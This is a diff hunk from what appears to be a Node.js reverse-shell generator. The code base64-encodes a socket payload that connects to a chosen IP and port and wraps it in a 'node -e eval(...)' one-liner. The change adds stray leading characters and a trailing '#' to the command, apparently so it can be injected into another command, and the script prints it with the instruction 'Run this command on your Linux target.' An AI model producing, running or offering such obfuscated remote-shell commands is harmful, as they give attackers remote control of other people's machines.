@@ -12,7 +12,7 @@ client.connect(${port},'${ip}',()=>{
 });`;
 
 const encoded = Buffer.from(payload).toString('base64');
-const command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;
+const command = `¿'; \\!` + `node -e "eval(Buffer.from('${encoded}','base64').toString())"` + `#`;
 
 console.log("Run this command on your Linux target:");
 console.log(command);
